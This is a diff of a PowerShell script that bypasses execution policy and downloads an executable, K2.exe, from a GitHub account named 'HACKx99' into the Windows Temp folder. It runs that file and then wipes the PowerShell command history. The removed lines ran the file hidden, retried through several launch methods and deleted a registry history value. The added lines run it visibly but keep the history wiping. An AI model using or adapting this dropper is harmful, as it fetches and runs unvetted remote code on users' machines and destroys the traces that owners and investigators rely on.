@@ -1,83 +1,33 @@
-# PowerShell Script to Download, Save to Windows Temp, Run EXE Silently, and Clear History
-
+# PowerShell Script to Download, Run EXE with UI, and Clear History
 try {
     # Bypass execution policy
     Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force -ErrorAction SilentlyContinue
 
-    # Use RAW GitHub URL for direct download
+    # Define paths and URL
     $exeUrl = "https://github.com/HACKx99/WebSite/raw/main/K2.exe"
     $tempPath = "C:\Windows\Temp\K2.exe"
     $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 
-    Write-Output "Downloading EXE from GitHub..."
-    
-    # Download the EXE to Windows Temp
+    # Download EXE
+    Write-Output "Downloading EXE..."
     Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -UseBasicParsing
 
-    # Verify download
     if (Test-Path $tempPath) {
-        Write-Output "EXE saved to Windows Temp successfully"
+        Write-Output "EXE downloaded successfully"
         
-        # Wait to ensure file is completely written
-        Start-Sleep -Seconds 3
-        
-        # Method 1: Start Process with proper parameters
-        Write-Output "Attempting to run EXE..."
-        $process = Start-Process -FilePath $tempPath -WindowStyle Hidden -PassThru
-        
-        # Wait and check if process is running
-        Start-Sleep -Seconds 2
-        if ($process.HasExited -eq $false) {
-            Write-Output "EXE is running successfully (PID: $($process.Id))"
-        } else {
-            Write-Warning "Process started but exited quickly, trying alternative method..."
-            
-            # Method 2: Use cmd to start the process
-            cmd.exe /c start "" /MIN "$tempPath"
-            Start-Sleep -Seconds 2
+        # Clear PowerShell history
+        Write-Output "Clearing history..."
+        Clear-History -ErrorAction SilentlyContinue
+        if (Test-Path $historyPath) {
+            Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
         }
+        Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
         
-        # Method 3: Check if any K2 process is running
-        $runningProcesses = Get-Process -Name "K2" -ErrorAction SilentlyContinue
-        if ($runningProcesses) {
-            Write-Output "EXE confirmed running (Processes: $($runningProcesses.Count))"
-        } else {
-            # Method 4: Try using Invoke-Item
-            Write-Output "Trying Invoke-Item method..."
-            Invoke-Item -Path $tempPath
-            Start-Sleep -Seconds 2
-        }
-        
-        # Final verification
-        $finalCheck = Get-Process -Name "K2" -ErrorAction SilentlyContinue
-        if ($finalCheck) {
-            Write-Output "✓ EXE successfully running in background (no visible UI)"
-        } else {
-            Write-Warning "! EXE may not be running - check manually in Task Manager"
-        }
-    } else {
-        throw "Download failed - file not found at $tempPath"
+        # Run EXE with visible UI immediately
+        Write-Output "Starting EXE with visible UI..."
+        Start-Process -FilePath $tempPath -WindowStyle Normal
+        Write-Output "EXE is now running with visible interface"
     }
-
-    # Forcefully clear PowerShell history
-    Write-Output "Clearing PowerShell history..."
-    
-    # Clear current session history
-    Clear-History -ErrorAction SilentlyContinue
-    
-    # Delete history file
-    if (Test-Path $historyPath) {
-        Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
-        Write-Output "History file removed forcefully"
-    }
-    
-    # Disable future history saving
-    Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
-    
-    # Clear registry history
-    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\PowerShell\PSReadLine" -Name "ConsoleHostHistory" -ErrorAction SilentlyContinue
-
-    Write-Output "PowerShell history cleared completely"
 
 } catch {
     Write-Error "Error: $($_.Exception.Message)"
